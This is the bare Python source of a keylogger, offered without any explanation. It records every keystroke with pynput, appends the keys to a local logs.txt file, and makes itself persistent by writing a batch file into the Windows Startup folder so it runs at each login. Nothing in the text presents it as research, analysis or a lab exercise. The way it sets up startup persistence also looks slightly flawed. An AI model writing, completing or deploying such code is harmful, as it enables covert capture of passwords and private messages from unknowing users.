from pynput import keyboard
import time
import os
import sys

log_file = "logs.txt"

def on_press(key):
    try:
        if key.char in ["0","1","2","3","4","5","6","7","8","9"]:
            current = key.char
        elif key == keyboard.Key.space:
            current = " "
        elif key.char.isalpha():
            current = key.char
        else:
            current = str(key)
    except AttributeError:
        current = str(key)
    with open(log_file, "a") as f:
        f.write(current)

def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = os.path.join(os.environ["APPDATA"], "Microsoft\Windows\Start Menu\Programs\Startup")
    with open(os.path.join(bat_path, "open.bat"), "w+") as bat_file:
        bat_file.write(r'start "" {} {}'.format(sys.executable, file_path))

add_to_startup()

with keyboard.Listener(on_press=on_press) as listener:
    while True:
        listener.join()
        time.sleep(900)
